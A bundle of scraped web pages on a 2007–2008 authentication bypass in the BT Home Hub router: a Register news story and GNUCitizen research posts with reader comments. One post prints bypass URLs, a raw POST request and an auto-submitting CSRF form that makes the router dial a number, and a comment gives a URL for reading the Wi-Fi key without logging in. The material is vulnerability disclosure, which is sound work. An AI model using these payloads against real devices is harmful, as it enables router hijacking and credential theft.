=== Content from www.theregister.co.uk_5a2d6df3_20250124_233020.html ===


[![](/design_picker/ae01b183a707a7db8cd5f2c947715ed56d335138/graphics/std/user_icon_white_extents_16x16.png)
![](/design_picker/ae01b183a707a7db8cd5f2c947715ed56d335138/graphics/std/user_icon_white_filled_extents_16x16.png)
Sign in / up](https://account.theregister.com/register/)

[![The Register® — Biting the hand that feeds IT](/design_picker/fa16d26efb42e6ba1052f1d387470f643c5aa18d/graphics/std/reg_logo_no_strapline.png)](https://www.theregister.com/)

[![](/design_picker/ae01b183a707a7db8cd5f2c947715ed56d335138/graphics/std/magnifying_glass_white_extents_16x16.png)](https://search.theregister.com/)

![](/design_picker/ae01b183a707a7db8cd5f2c947715ed56d335138/graphics/icon/burger_menu_white_16x16.png)
![](/design_picker/ae01b183a707a7db8cd5f2c947715ed56d335138/graphics/icon/burger_menu_white_close_16x16.png)

## Topics

[Security](#subnav-box-nav-security)
## [Security](#subnav-box-nav-security)

[All Security](https://www.theregister.com/security/)[Cyber-crime](https://www.theregister.com/security/cyber_crime/)[Patches](https://www.theregister.com/security/patches/)[Research](https://www.theregister.com/security/research/)[CSO](https://www.theregister.com/security/cso/)
[(X)](#masthead)

[Off-Prem](#subnav-box-nav-off_prem)
## [Off-Prem](#subnav-box-nav-off_prem)

[All Off-Prem](https://www.theregister.com/off_prem/)[Edge + IoT](https://www.theregister.com/off_prem/edge_iot/)[Channel](https://www.theregister.com/off_prem/channel/)[PaaS + IaaS](https://www.theregister.com/off_prem/paas_iaas/)[SaaS](https://www.theregister.com/off_prem/saas/)
[(X)](#masthead)

[On-Prem](#subnav-box-nav-on_prem)
## [On-Prem](#subnav-box-nav-on_prem)

[All On-Prem](https://www.theregister.com/on_prem/)[Systems](https://www.theregister.com/on_prem/systems/)[Storage](https://www.theregister.com/on_prem/storage/)[Networks](https://www.theregister.com/on_prem/networks/)[HPC](https://www.theregister.com/on_prem/hpc/)[Personal Tech](https://www.theregister.com/on_prem/personal_tech/)[CxO](https://www.theregister.com/on_prem/cxo/)[Public Sector](https://www.theregister.com/on_prem/public_sector/)
[(X)](#masthead)

[Software](#subnav-box-nav-software)
## [Software](#subnav-box-nav-software)

[All Software](https://www.theregister.com/software/)[AI + ML](https://www.theregister.com/software/ai_ml/)[Applications](https://www.theregister.com/software/applications/)[Databases](https://www.theregister.com/software/databases/)[DevOps](https://www.theregister.com/software/devops/)[OSes](https://www.theregister.com/software/oses/)[Virtualization](https://www.theregister.com/software/virtualization/)
[(X)](#masthead)

[Offbeat](#subnav-box-nav-offbeat)
## [Offbeat](#subnav-box-nav-offbeat)

[All Offbeat](https://www.theregister.com/offbeat/)[Debates](https://www.theregister.com/Debates/)[Columnists](https://www.theregister.com/offbeat/columnists/)[Science](https://www.theregister.com/offbeat/science/)[Geek's Guide](https://www.theregister.com/offbeat/geeks_guide/)[BOFH](https://www.theregister.com/offbeat/bofh/)[Legal](https://www.theregister.com/offbeat/legal/)[Bootnotes](https://www.theregister.com/offbeat/bootnotes/)[Site News](https://www.theregister.com/offbeat/site_news/)[About Us](https://www.theregister.com/offbeat/about_us/)
[(X)](#masthead)

[Special Features](#subnav-box-nav-special_features)
## Special Features

[All Special Features](https://www.theregister.com/special_features)
[The Future of the Datacenter](https://www.theregister.com/special_features/future_of_the_datacenter)
[Cybersecurity Month](https://www.theregister.com/special_features/cybersecurity_month)
[VMware Explore](https://www.theregister.com/special_features/vmware_explore)
[Cloud Infrastructure Month](https://www.theregister.com/special_features/cloud_infrastructure_month)

## Vendor Voice

[Vendor Voice](#subnav-box-nav-tag-vendor-voice)
## [Vendor Voice](#subnav-box-nav-tag-vendor-voice)

[All Vendor Voice](https://www.theregister.com/VendorVoice/)
[Amazon Web Services (AWS) New Horizon in Cloud Computing](https://www.theregister.com/VendorVoice/aws_new_horizon_financial_services/)
[Pure Storage](https://www.theregister.com/VendorVoice/pure_storage_portworx/)
[Kilka Tech](https://www.theregister.com/VendorVoice/aws_klika_tech/)
[HERE and AWS](https://www.theregister.com/VendorVoice/aws_here/)
[Vonage](https://www.theregister.com/VendorVoice/aws_vonage/)
[GE Vernova with AWS](https://www.theregister.com/VendorVoice/aws_ge_vernova_manufacturing/)
[Google Cloud Data Transformation](https://www.theregister.com/VendorVoice/google_cloud_data_transformation/)
[Google Gemini](https://www.theregister.com/VendorVoice/google_gemini/)
[(X)](#masthead)

[Resources](#subnav-box-nav-resources)
## Resources

[Whitepapers](https://whitepapers.theregister.com/)
[Webinars & Events](https://whitepapers.theregister.com/events/list/)
[Newsletters](https://account.theregister.com/edit/newsletter/)

[![](https://pubads.g.doubleclick.net/gampad/ad?co=1&iu=/6978/reg_offprem/channel&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=2&c=2Z5Qii1PLBgOPLAjC-o74EgAAAEA&t=ct%3Dns%26unitnum%3D2%26raptor%3Dcondor%26pos%3Dtop%26test%3D0)](https://pubads.g.doubleclick.net/gampad/jump?co=1&iu=/6978/reg_offprem/channel&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=2&c=2Z5Qii1PLBgOPLAjC-o74EgAAAEA&t=ct%3Dns%26unitnum%3D2%26raptor%3Dcondor%26pos%3Dtop%26test%3D0)

#### [Channel](/off_prem/channel/)

[**53**
![comment bubble on white](/design_picker/f5daacc84b9722c1e31ba85f836c37e4ad993fc4/graphics/icons/bubble_comment_white.png)](https://forums.theregister.com/forum/all/2007/10/09/bt_home_hub_vuln/ "View comments on this article")

This article is more than **1 year old**

# BT home router wide open to hijackers

[**53**
![comment bubble on white](/design_picker/f5daacc84b9722c1e31ba85f836c37e4ad993fc4/graphics/icons/bubble_comment_white.png)](https://forums.theregister.com/forum/all/2007/10/09/bt_home_hub_vuln/ "View comments on this article")

## Authentication bypass exposes many customers

![icon](/design_picker/d518b499f8a6e2c65d4d8c49aca8299d54b03012/graphics/icon/vulture_red.svg)
[Dan Goodin](/Author/Dan-Goodin "Read more by this author")

Tue 9 Oct 2007  //
00:34 UTC

![](/design_picker/d2e337b97204af4aa34dda04c4e5d56d954b216f/graphics/icons/social_share_icon.svg)

Updated If you rely on BT for high-speed internet or VoIP, there's a good chance a pair of UK-based researchers know how to enable a backdoor in your router that leaves you wide open to eavesdropping, caller spoofing and other nasty attacks.

The vulnerability resides in the BT Home Hub, one of the UK's most popular home routers, according to Adrian Pastor and Petko D. Petkov. A constellation of bugs in the router, which is made by Thomson/Alcatel, make it possible to bypass the device's password authentication system and gain complete administrative control.

All an attacker needs to do to exploit the weaknesses is lure the victim to a maliciously crafted website, according to [this post](http://www.gnucitizen.org/blog/bt-home-flub-pwnin-the-bt-home-hub) on the GNUCitizen blog. The exploit doesn't require knowledge of the administrator password.

[![](https://pubads.g.doubleclick.net/gampad/ad?co=1&iu=/6978/reg_offprem/channel&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=2&c=2Z5Qii1PLBgOPLAjC-o74EgAAAEA&t=ct%3Dns%26unitnum%3D2%26raptor%3Dcondor%26pos%3Dtop%26test%3D0)](https://pubads.g.doubleclick.net/gampad/jump?co=1&iu=/6978/reg_offprem/channel&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=2&c=2Z5Qii1PLBgOPLAjC-o74EgAAAEA&t=ct%3Dns%26unitnum%3D2%26raptor%3Dcondor%26pos%3Dtop%26test%3D0)

"The BT Home Hub is vulnerable to an authentication bypass that allows us to make any administrative requests to the router from a malicious website WITHOUT needing username and password," Pastor wrote in an email to *The Reg*. He and Petkov have confirmed the vulnerability in the BT Home Hub running the most recent firmware. They believe the exploit will work on all Thomson/Alcatel Speedtouch 7G routers.

[![](https://pubads.g.doubleclick.net/gampad/ad?co=1&iu=/6978/reg_offprem/channel&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=4&c=44Z5Qii1PLBgOPLAjC-o74EgAAAEA&t=ct%3Dns%26unitnum%3D426raptor%3Dfalcon%26pos%3Dmid%26test%3D0)](https://pubads.g.doubleclick.net/gampad/jump?co=1&iu=/6978/reg_offprem/channel&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=4&c=44Z5Qii1PLBgOPLAjC-o74EgAAAEA&t=ct%3Dns%26unitnum%3D4%26raptor%3Dfalcon%26pos%3Dmid%26test%3D0)

BT security pros are "actively investigating" the reported holes, according to a statement sent Tuesday. "However, as part of a series of ongoing improvements, this week we began pushing out a new firmware update to Home Hub owners which further improves security in a number of areas," the statement continued. BT didn't elaborate on what the security improvements.

The scope of the vulnerability and the ease in carrying it out means that a remote attacker can quietly gain full administrator control over a device simply by social engineering a user into visiting a website. The exploit makes it possible to steal a user's WPA key, listen in on VoIP calls, steal VoIP credentials or change DNS settings so users are silently redirected to fraudulent websites.

[![](https://pubads.g.doubleclick.net/gampad/ad?co=1&iu=/6978/reg_offprem/channel&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=4&c=44Z5Qii1PLBgOPLAjC-o74EgAAAEA&t=ct%3Dns%26unitnum%3D426raptor%3Dfalcon%26pos%3Dmid%26test%3D0)](https://pubads.g.doubleclick.net/gampad/jump?co=1&iu=/6978/reg_offprem/channel&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=4&c=44Z5Qii1PLBgOPLAjC-o74EgAAAEA&t=ct%3Dns%26unitnum%3D4%26raptor%3Dfalcon%26pos%3Dmid%26test%3D0)

Thomson/Alcatel's Speedtouch 780, a similar router used by Bethere, shares some of the same cross-site-scripting and cross-site-request forgery bugs found on the BT Home Hub. But because it's not vulnerable to authentication bypass, attackers have to know the router's password in order to gain administrative control, Pastor said. ®

**Get our** [Tech Resources](https://whitepapers.theregister.com/)

![](/design_picker/d2e337b97204af4aa34dda04c4e5d56d954b216f/graphics/icons/social_share_icon.svg)
Share

#### More about

* [Botnet](/Tag/Botnet/)
* [Broadband](/Tag/Broadband/)
* [Hacking](/Tag/Hacking/)

More like these

×
### More about

* [Botnet](/Tag/Botnet/)
* [Broadband](/Tag/Broadband/)
* [Hacking](/Tag/Hacking/)

### Narrower topics

* [Comcast](/Tag/Comcast/)
* [Hacktivism](/Tag/Hacktivism/)

### Broader topics

* [Hacker](/Tag/Hacker/)
* [Internet](/Tag/Internet/)
* [Network](/Tag/Network/)
* [Security](/Tag/Security/)

#### More about

![](/design_picker/d2e337b97204af4aa34dda04c4e5d56d954b216f/graphics/icons/social_share_icon.svg)
Share

[**53**
![comment bubble on white](/design_picker/f5daacc84b9722c1e31ba85f836c37e4ad993fc4/graphics/icons/bubble_comment_white.png)
COMMENTS](https://forums.theregister.com/forum/all/2007/10/09/bt_home_hub_vuln/ "View comments on this article")

#### More about

* [Botnet](/Tag/Botnet/)
* [Broadband](/Tag/Broadband/)
* [Hacking](/Tag/Hacking/)

More like these

×
### More about

* [Botnet](/Tag/Botnet/)
* [Broadband](/Tag/Broadband/)
* [Hacking](/Tag/Hacking/)

### Narrower topics

* [Comcast](/Tag/Comcast/)
* [Hacktivism](/Tag/Hacktivism/)

### Broader topics

* [Hacker](/Tag/Hacker/)
* [Internet](/Tag/Internet/)
* [Network](/Tag/Network/)
* [Security](/Tag/Security/)

#### TIP US OFF

[Send us news](https://www.theregister.com/Profile/contact/)

---

### Other stories you might like

[#### BT unplugs plans to turn old cabinets into EV chargepoints

Your battery might be flat, but the Wi-Fi signal is going to be great
Personal Tech20 Jan 2025 | 97](/2025/01/20/bt_ev_chargepoints/?td=keepreading)

[#### Raspberry Pi hands out prizes to all in the RP2350 Hacking Challenge

Power-induced glitches, lasers, and electromagnetic fields are all tools of the trade
Security16 Jan 2025 | 18](/2025/01/16/raspberry_pi_awards_prizes_for/?td=keepreading)

[#### How Androxgh0st rose from Mozi's ashes to become 'most prevalent malware'

Botnet's operators 'driven by similar interests as that of the Chinese state'
Cyber-crime24 Dec 2024 | 3](/2024/12/24/androxgh0st_botnet_mozi/?td=keepreading)

[#### Fortify your data

How cyber resilient storage hardware can defeat ransomware
Sponsored Feature](/2024/11/26/fortify_your_data/?td=keepreading)

[![](https://pubads.g.doubleclick.net/gampad/ad?co=1&iu=/6978/reg_offprem/channel&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=6&c=66Z5Qii1PLBgOPLAjC-o74EgAAAEA&t=ct%3Dns%26unitnum%3D6%26raptor%3Dhawk%26pos%3Dbtm%26test%3D0)](https://pubads.g.doubleclick.net/gampad/jump?co=1&iu=/6978/reg_offprem/channel&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=6&c=66Z5Qii1PLBgOPLAjC-o74EgAAAEA&t=ct%3Dns%26unitnum%3D6%26raptor%3Dhawk%26pos%3Dbtm%26test%3D0)

[#### Former NSA cyberspy's not-so-secret hobby: Hacking Christmas lights

Video Rob Joyce explains how it's done
Security25 Dec 2024 | 42](/2024/12/25/joyce_christmas_lights/?td=keepreading)

[#### Taiwan in talks to tap Amazon's Project Kuiper space broadband

In case of submarine cable failure, call Jeff Bezos
Networks18 Dec 2024 | 6](/2024/12/18/taiwan_amazon_kuiper_broadband_talks/?td=keepreading)

[#### Europe signs off on €10.6B IRIS² satellite broadband deal

Service promised by 2030 for bloc's take on Starlink
Networks16 Dec 2024 | 41](/2024/12/16/europe_iris2_broadband_deal/?td=keepreading)

[#### China preps another rocket that Beijing hopes will become its workhorse

Long March-8A improves payload by forty percent and comes just a month after Long March 12 debut
Science12 Dec 2024 | 6](/2024/12/12/china_rocket_long_march_8a_broadband/?td=keepreading)

[#### Andrew Tate's site ransacked, subscriber data stolen

He'll just have to take this one on the chin
Cyber-crime22 Nov 2024 | 106](/2024/11/22/andrew_tate_raid/?td=keepreading)

[#### Starlink finally files proper paperwork to operate in India

Government both excited and cautious about benefits of Muskband
Personal Tech14 Nov 2024 | 4](/2024/11/14/starlink_india_again/?td=keepreading)

[#### Alleged Snowflake attacker gets busted by Canadians – politely, we assume

Infosec in brief Also: Crypto hacks will continue; CoD hacker gets thousands banned, and more
Security11 Nov 2024 |](/2024/11/11/infosec_in_brief/?td=keepreading)

[#### Half the world's online via mobile, but growth is slowing

Nearly all of those without access live in low to middle income countries, GSMA says
Networks28 Oct 2024 | 7](/2024/10/28/gsma_mobile_internet/?td=keepreading)

The Register ![icon](/design_picker/d518b499f8a6e2c65d4d8c49aca8299d54b03012/graphics/icon/vulture_white.png) Biting the hand that feeds IT

#### About Us

* [Contact us](https://www.theregister.com/Profile/contact/)
* [Advertise with us](https://www.theregister.com/AdvertiseWithUs/)
* [Who we are](https://www.theregister.com/Profile/about_the_register/)

#### Our Websites

* [The Next Platform](https://www.nextplatform.com/)
* [DevClass](https://devclass.com/)
* [Blocks and Files](https://blocksandfiles.com/)

#### Your Privacy

* [Cookies Policy](https://www.theregister.com/Profile/cookies/)
* [Privacy Policy](https://www.theregister.com/Profile/privacy/)
* [Ts & Cs](https://www.theregister.com/Profile/terms_and_conditions_of_use/)

[![Situation Publishing](/design_picker/d2e337b97204af4aa34dda04c4e5d56d954b216f/graphics/std/sitpublogo_2022.png)](https://situationpublishing.com/)

Copyright. All rights reserved © 1998–2025

![no-js](/Design/graphics/std/transparent_pixel.png)



=== Content from securityreason.com_f6ea42c3_20250124_233016.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from www.gnucitizen.org_fef40f72_20250124_233018.html ===


* [Home](/)
* [Projects](/projects.html)
* [Files](/files)
* [About](/about.html)
# Holes In Embedded Devices Authentication Bypass (pt 1)

Thu, 14 Feb 2008 12:13:33 GMTby
pagvac

Finding authentication bypass bugs is an obvious choice for attackers, since such bugs allow administrative changes to be made without knowledge of the admin password. In other words, compromising the target device without requiring a password is of course something attackers are interested in! You bet!

After performing my own research and going through authentication bypass bugs on embedded devices published by other peers in the community, I came to the conclusion that these bugs are usually (or at least quite often) very simple flaws in web interfaces. Once you find one of these bugs they are usually trivial to exploit, and remind you of web vulnerabilities that you would expect finding in the 90s, but not these days.

The fact that embedded devices are very primitive in terms of hardware, ultimately means that the security of the software running on them is also sacrificed. Most of the authentication bypass bugs found on web interfaces of embedded devices fall into one of the following categories:

* URL fuzzing a.k.a. additional representation of URLs
* A-to-C attacks a.k.a. knowledge of "post-authentication" URLs
* Unchecked HTTP methods
* Unchecked administrative HTTP requests aka unprotected cgi scripts
* Unprotected redirects

We will go through all these authentication bypass bugs in detail. For this post, we will only cover the first type: URL fuzzing a.k.a. additional representation of URLs<.

## Authentication bypass via URL fuzzing

URL fuzzing targets bugs in the web server or server-side scripts that are part of the web console of an embedded device. These bugs could be due to a poorly-written regex, and finding them is all about finding alternative ways to represent a URL that would usually grant access to administrative functionalities. Sometimes, there are multiple ways a URL can be represented which is still understood by the target device, but causes the device to not require the user to enter a password.

For instance, the BT Home Hub, which is the most popular DSL router in the UK is [vulnerable](/blog/bt-home-flub-pwnin-the-bt-home-hub-4) to an authentication bypass bug due to the device accepting multiple representations of the same URL as valid, but only checking for password when submitting URLs in their original form. For [example](https://chatbotkit.com/examples), the URL for accessing the firewall settings looks like: `http://bthomehub/cgi/b/secpol/cfg/` or `http://bthomehub/cgi/b/secpol/cfg/?ce=1&be=1&l0=4&l1=7` (they're both equivalent). However, appending various characters after the directory path allows attackers to completely bypass the authentication prompt:

* <http://bthomehub/cgi/b/secpol/cfg/%5C>
* <http://bthomehub/cgi/b/secpol/cfg//>
* [http://bthomehub/cgi/b/secpol/cfg/%](http://bthomehub/cgi/b/secpol/cfg/%25)
* <http://bthomehub/cgi/b/secpol/cfg/>~

...and so on. The same technique could be used in this case not only to retrieve administrative settings, but also to make administrative changes. The only difference is that the requests must be submitted as POST rather than GET, but we still append the special characters to the URL the POST request is submitted to.For instance, the following POST request causes the BT Home Hub to call the Internet Office of the Holy See. Notice the double slash in the POST URL:

```
POST /cgi/b/_voip_/stats//?ce=1&be=0&l0=-1&l1=-1&name= HTTP/1.1
Host: bthomehub

0=30&1=00390669893461
```

Such requests could be submitted by the victim's web browser via a HTML form with a `method="POST"` attribute:

```
<html>
<body>
<form name="form" method="POST" enctype="application/x-www-form-urlencoded" action="http://bthomehub/cgi/b/_voip_/stats//?ce=1&be=0&l0=-1&l1=-1&name=">
<input type="hidden" name="0" value="30"/>
<input type="hidden" name="1" value="00390669893461"/>
</form>
<script>form.submit()</script>
</body>
</html>
```

*Archived Comments*

![nexact](//gravatar.com/avatar/5df87b40193ad4365f6399456f16dd5e?s=256&d=retro)nexacthey pdp!
did I gave you some idea with my auth bypass for airspan prost antenna ? heheh ;)
good posts. ;-)
btw.. if your able to put your hand on a device with port 23 open and you have the firmware.. disassemble it, check if you can't find a default login/passwd account in it.. i made a found during a pentest, apc battery had a backdoor account.. I've been able to go in debug mode and dump the eeprom then gain access to web interface. gg. :)
i know theres a couple of websites around there that giving out default password but you can be \*really\* surprised if u take a look by yourself.![nexact](//gravatar.com/avatar/5df87b40193ad4365f6399456f16dd5e?s=256&d=retro)nexacts/pdp/ap/ in the last comments![Adrian Pastor](//gravatar.com/avatar/ef14ae4ef69235fa6c3709438357819d?s=256&d=retro)Adrian Pastorhey nexact, thanks for your feedback! just for the record the BT Home Hub auth bypass mentioned as an example was published in Oct 2007 (http://www.gnucitizen.org/blog/bt-home-flub-pwnin-the-bt-home-hub) and found a month before that.
Needless to say, URL fuzzying is nothing new. The point of this post series is to show that embedded devices can be susceptible to \*very\* trivial auth bypass bugs.
You're so right, that we shouldn't just rely on documented default accounts when trying to find a valid username/password combination. Reverse-engineering the firmware is definitely the way forward!![ap](//gravatar.com/avatar/ef14ae4ef69235fa6c3709438357819d?s=256&d=retro)apcorrection: "that we shouldn't just rely" -> "we shouldn't just rely"![NurBo](//gravatar.com/avatar/4236928e0739f6875dc108729a1e12be?s=256&d=retro)NurBogood shez Adrian Pastor keep it up I like all 3 parts!![joephantom](//gravatar.com/avatar/d8582ad45d02151e2f22560a64036336?s=256&d=retro)joephantomnice photo. differential equations and gauss's divergence are your best friends.![spenser](//gravatar.com/avatar/beb21939f6a5a1e3b48faa2d5eed358a?s=256&d=retro)spenserNever mind a ups.
There is a $30K+ "enterprise unified threat management" appliance that seems to have a hard coded backdoor super admin account that is not documented to purchasers. It certainly is not mentioned in the documentation. But, it can be seen plain as day to anyone looking at the firmware.
As a matter of fact, in recent years, the newsgroups are rife with complaints from admins that the first thing support wants when called is to be granted admin access from outside the perimeter. Naturally, due to the fact that firewall admins are likely to be somewhat aware of security, this tendency has raised a great deal of derision. The existence of a secret "super admin" account would certainly explain the desire of first level support techs to gain permission to logon.

Copyright © 2025 . All rights reserved.



=== Content from www.gnucitizen.org_2db0dbe8_20250124_233017.html ===


* [Home](/)
* [Projects](/projects.html)
* [Files](/files)
* [About](/about.html)
# BT Home Flub - Pwnin the BT Home Hub

Mon, 08 Oct 2007 16:41:42 GMTby
pagvac

OK, let me get to the point. The [BT Home Hub](https://en.wikipedia.org/wiki/BT_Home_Hub), which is probably the most popular home router in the UK, is susceptible to critical vulnerabilities.

BT's plan is to sneak one of these boxes into every UK home. Not only does the BT Home Hub support broadband but also VoIP (BT Broadband Talk), [UMA](https://en.wikipedia.org/wiki/Generic_Access_Network) mobile telephony ([BT Fusion](https://en.wikipedia.org/wiki/BT_Fusion)), and digital TV ([BT Vision](http://www.btvision.bt.com/vision/index.htm)). Additionally BT will give users the option to use their BT Home Hub to join [FON](http://blog.wired.com/gadgets/2007/10/fon-and-bt-in-i.html), a community-shared Wi-Fi. An unofficial source has reported us that there are *2+ million BT Home Hub users* in the UK.

If you're thinking: "well I'm not based in the UK so this research doesn't concern me", then think again! The BT Home Hub is just a Thomson/Alcatel [Speedtouch 7G](http://ugolini.com.au/speedtouch/routers/7G/GENERIC%20DOCUMENTATION/Picture/7G.jpg) router. Furthermore, the vulnerabilities we found are most likely present in other Speedtouch models due to code reuse (more on that later).

So what can we do? Well, we can fully own the router remotely. At the moment we have three demo exploits which do the following:

* enable backdoor in order to control the router remotely
* disable wireless completely (can only be re-enabled if the user is technically capable)
* steal the WEP/WPA key

Of course there other other attacks you could launch! We can hijack any action with full admin privileges or steal any info returned by a router's page. This means evilness of the exploits are only limited by the attacker's imagination. Other [examples](https://chatbotkit.com/examples) of evil attacks include evesdropping VoIP conversations (change 'sip config primproxyaddr' statement in config file), stealing VoIP credentials, exposing internal hosts on the DMZ, change the DNS settings for stealing online banking credentials, disable auto updates (change `cwmp.ini` section in config file), etc ...

The only requirement for the router to be owned is that a victim user visits a (malicious) website. The good news is that our exploits do NOT require knowledge of the admin password! How can that be? Well, we rely on a authentication bypass bug we discovered!

Even though I've been the owner of a BT Home Hub for quite a while, I never bothered to try to find vulnerabilities in it. However, on the last [dc4420](http://dc4420.org/) meeting, after I gave a talk on [breaking into Axis cameras](http://www.procheckup.com/Vulnerability_Axis_2100_research.pdf), some of the guys there inspired me to research the BT Home Hub. After poking with it for a while, pdp and I couldn't believe how vulnerable the web interface of the device was! I remember pdp sarcastically saying: "wow, it's really locked down man!", We discovered issues such as:

* authentication bypass (any admin action can be made without username/password!)
* system-wide CSRF
* several persistent XSS
* several non-persistent XSS
* privilege escalation

We're now in the process of contacting BT and Thomson. However, I don't have high hopes for BT. Last year, I [found](http://unknown.pentester.googlepages.com/bt-voyager-unauth-access.txt) a way to dump the BT Voyager 2091's config file without credentials. Even though I forwarded them my findings they never responded at all.

*Enjoy the demo video which was kindly prepared by pdp. We misspelled some words on the [chat](https://chatbotkit.com) conversation, so please forgive us! In the video, the attacker social-engineers the victim to visit a malicious website. The malicious website in turn enables remote assistance on the victim's router with a password chosen by the attacker. After that, the attacker gains full privileges to the router remotely, and steals the config file and WEP key.*

*Archived Comments*

![pdp](//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&d=retro)pdphere comes the stage6 video: http://stage6.divx.com/user/gnucitizen/video/1722388/BT-Home-Flub![Hubert](//gravatar.com/avatar/375c0284a6efd8899f2bc69dbf99d6e3?s=256&d=retro)HubertNice work. A configuration interface that's not web-based at all, like on my Apple Airport Extreme router might be a good idea after all.
The web and telnet interface on the Thomson router I've used was better designed and had more features than those I've seen on Belkin and Netgear devices, but obviously they have some work to do towards making it secure.![devloop](//gravatar.com/avatar/cf3ff7853a134bfba57f96be896b037a?s=256&d=retro)devloopHi guys ! I found a similar vulnerability in a modem/router provided by one of our ISP in France (Neuf Telecom)
The router got a web administration interface WITHOUT password-protection and it's vulnerable to CSRF and a persistent XSS.
Intruders can create NAT rules, change WEP/WPA encryption and password, activate/deactivate the hotspot or steal the credentials for the PPoA connection :p
But the router is very basic so it's not possible to change DNS servers or stuff like that.
Article here (in french): http://devloop.lyua.org/blog/index.php?2007/09/23/468-la-securite-de-la-neufbox-4![phill](//gravatar.com/avatar/7a73c170a64a3f5b5477cde76feb39d9?s=256&d=retro)phillI have a home hub. Is there anything I can do to stop this? Is there a port I can close or something?![pdp](//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&d=retro)pdpphill, at the moment I don't think that there is a way to protect yourself from this type of attack at router level. You need to upgrade as soon as BT releases an update.![memals](//gravatar.com/avatar/23463b99b62a72f26ed677cc556c44e8?s=256&d=retro)memalsphill: just do not visit any maliciouss websites.
easy ;)![Mark Kent](//gravatar.com/avatar/127018260c84206ff23de0c314db4487?s=256&d=retro)Mark KentHi Adrian,
Please send me any details you have, and I'll aim to get them to the right people in BT.
Best regards,
Mark Kent![Adrian Pastor](//gravatar.com/avatar/ef14ae4ef69235fa6c3709438357819d?s=256&d=retro)Adrian Pastorphill,
If you are a fan of Firefox extensions, NoScript filters cross-site POST requests from untrusted to trusted sites. This protection should avoid someone exploiting your router if properly configured.![zip](//gravatar.com/avatar/20576f636feeb1a41b30d9f090ab2e24?s=256&d=retro)zipNice music, who is the artist ?![blah](//gravatar.com/avatar/10468ad8d146df7dc85e4f8c51ef542e?s=256&d=retro)blahWhat's the point of the post other then to promote yourself? Users of this modem have no work around let alone patch.
"However, I don't have high hopes for BT" Obviously you didn't learn from your previous experience. If you releas code they'll fix it. By making your... annoucement you've given enough direction for people with malicious intent to find what you have. But you know all this.
zip; the tune is a... Spanish? version of, the girl from ipanema.![robadams](//gravatar.com/avatar/72d98cbf017621a2440026135969c992?s=256&d=retro)robadamsCaetano Veloso - Garota de Ipanema. Lovin' it![vijay](//gravatar.com/avatar/6b16c4e55cd0b1a9054c38d336f8dc8d?s=256&d=retro)vijayInteresting research. Btw you can disable remote assistance if you follow the instructions at the following site: http://baldric.net/2007/01/22/bt-home-hub-and-the-gpl/
to get "root privileges" then under [ mlpuser.ini ] and delete "defremadmin=enabled" or better yet:
just delete the tech user completely. You could also change the RAS port under [ system\_raccess.ini ] although you wouldn't gain much.![Adrian Pastor](//gravatar.com/avatar/ef14ae4ef69235fa6c3709438357819d?s=256&d=retro)Adrian Pastorbtw, I forgot to give thanks to Jan Fry for testing the vulnerabilities on the Thomson/Alcatel's Speedtouch 780 (provided by BeThere in the UK).
zip, the song is Brazilian I believe (sung in Portuguese).
blah, I don't think there is anything wrong with publishing vulnerability research, especially when it's independent and unpaid.
The good news is we have been in touch with some technical people from BT who are in the process of verifying the vulnerabilities we found.![Taffy](//gravatar.com/avatar/1e537fa4eeaf5358adbd3a6e92e1f9dd?s=256&d=retro)TaffyI dout BT will do anything .. as they already have a bad reputation with this kind of stuff![antivirustaneja](//gravatar.com/avatar/6bb4ba2dd74e93656b857c9397b29db4?s=256&d=retro)antivirustanejaNice work...bt if you release the code as well only then they'll do as quickly as they can ....moreover hereafter they can't ignore your research.......![DavidB](//gravatar.com/avatar/b98c01ec66a379144347eeb1cbdc9520?s=256&d=retro)DavidBI know there are supposed to be some malicious sites that have cross-scripting to perform attacks on machines/routers. Does anyone have a list of these as I'd like to put some additional rules into my firewalls to prevent access to these sites?![Adrian Pastor](//gravatar.com/avatar/ef14ae4ef69235fa6c3709438357819d?s=256&d=retro)Adrian PastorDavidB,
That would be very unfeasible. Probably the closest thing you can do to that is using a black-list database from some popular web content filtering proxy software.
I mean, the malicious JS that exploits your router could be anywhere such as in a free .googlepages.com webpage.![John](//gravatar.com/avatar/7e8241dcea25a2f0c5673668bf496287?s=256&d=retro)JohnI've been looking into the BT homehub recently, I'm interested to see how secure the remote desktop facility is.![1337](//gravatar.com/avatar/70212aaf094cb8b1b057b5b1fed8d59b?s=256&d=retro)1337Any exploits for Software version: 6.2.6.B ? These Homehubs really are weak. A padlock from poundland is more secure!![Adrian Pastor](//gravatar.com/avatar/ef14ae4ef69235fa6c3709438357819d?s=256&d=retro)Adrian Pastor1337:
The CSRF, XSS and double-slash auth bypass are still there on version 6.2.6.B.
For instance, although version 6.2.6.B has now password-protected the page that shows the WEP/WPA, it's still possible to access it \*without\* authenticating by ending the URL with 2 slashes:
http://192.168.1.254/cgi/b/\_wli\_/seccfg//
Try it on your Home Hub. It should work. This means that people can still steal your WEP/WPA key by scraping the previous URL through one of the many XSS vulns still present on version 6.2.6.B.
However, version 6.2.6.B has added lots of restrictions such as disabling telnet, remote assistance and worst of all: the config file is now encrypted/obfuscated!: http://192.168.1.254/cgi/b/backup/user.ini//
However, I have not checked if uploading a clear-text version of the config file still works. If so, you could still mod your own Home Hub without restrictions by simply editing user.ini.
Check out our other 'Pwnin the BT Home Hub' posts for more info:
http://www.gnucitizen.org/blog/bt-home-flub-pwnin-the-bt-home-hub-2
http://www.gnucitizen.org/blog/bt-home-flub-pwnin-the-bt-home-hub-3
